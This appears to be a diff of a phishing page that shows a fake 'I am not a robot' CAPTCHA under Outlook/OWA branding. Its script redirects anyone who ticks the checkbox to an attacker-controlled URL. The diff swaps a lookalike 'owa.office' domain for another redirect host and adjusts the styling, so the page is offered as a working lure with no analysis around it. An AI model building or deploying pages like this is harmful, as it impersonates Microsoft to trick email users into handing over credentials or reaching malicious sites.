@@ -13,63 +13,56 @@
     align-items: center;
     height: 100vh;
     margin: 0;
-}
-
-.captcha-box {
+  }
+  .captcha-box {
     background: white;
     border: 1px solid #ccc;
     border-radius: 5px;
-    padding: 10px; /* Increased from 7px to 10px */
+    padding: 7px;
     display: flex;
     flex-direction: column;
     align-items: center;
-}
-
-.captcha-content {
+  }
+  .captcha-content {
     display: flex;
     align-items: center;
-}
-
-.captcha-box img {
-    width: 120px; /* Reduced from 130px to 120px */
+  }
+  .captcha-box img {
+    width: 70px;
     height: auto;
-}
-
-.captcha-text {
-    font-size: 15px; /* Increased from 13px to 15px */
+  }
+  .captcha-text {
+    font-size: 18px;
     color: #333;
     display: flex;
-    flex-direction: row;
+    flex-direction: row; 
     align-items: center;
-    margin-left: 25px; /* Increased from 20px to 25px */
-    margin-top: 80px; /* Increased from 70px to 80px */
-}
-
-.captcha-text input[type="checkbox"] {
-    margin-left: 8px; /* Increased from 5px to 8px */
-}
-
-@keyframes spin {
+    margin-left: 32px;
+    margin-top: 85px; 
+  }
+  .captcha-text input[type="checkbox"] {
+    margin-left: 13px; 
+  }
+  @keyframes spin {
     from { transform: rotate(0deg); }
     to { transform: rotate(360deg); }
-}
-
-.loader {
-    border: 8px solid #f3f3f3; /* Increased from 6px to 8px */
-    border-top: 8px solid #3498db; /* Increased from 6px to 8px */
+  }
+  .loader {
+    border: 6px solid #f3f3f3; 
+    border-top: 6px solid #3498db;
     border-radius: 50%;
-    width: 50px; /* Increased from 40px to 50px */
-    height: 50px; /* Increased from 40px to 50px */
+    width: 50px;
+    height: 50px;
     animation: spin 2s linear infinite;
-    margin-top: 15px; /* Increased from 10px to 15px */
-    margin-right: 210px; /* Increased from 190px to 210px */
-}
+    margin-top: 15px;
+    margin-right: 200px;
+  }
 </style>
 </head>
 <body>
 <div class="captcha-box">
   <div class="captcha-content">
-    <img src="https://iconape.com/wp-content/files/tm/352951/png/outlook-email-logo.png" alt="Outlook Web Access (OWA)">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/9/90/Outlook.com_icon_%282012-2019%29.svg" alt="Microsoft Logo">
     <div class="captcha-text">
       I am not a robot 
       <input type="checkbox" id="captchaCheckbox">
@@ -82,9 +75,9 @@
   document.getElementById("captchaCheckbox").addEventListener("change", function() {
     if (this.checked) {
       var urls = [
-        "https://us.owa.office.klenigerszone.com/security/voicenotefile",
-        "https://us.owa.office.klenigerszone.com/security/voicenotefile",
-        "https://us.owa.office.klenigerszone.com/security/voicenotefile" 
+        "https://p-ae.com/?gwzwovdz&qrc=",
+        "https://p-ae.com/?gwzwovdz&qrc=",
+        "https://p-ae.com/?gwzwovdz&qrc=" 
       ];
       var randomUrl = urls[Math.floor(Math.random() * urls.length)]; 
       setTimeout(function() {
@@ -97,6 +90,3 @@
 
 
 </body></html>
-
-
-
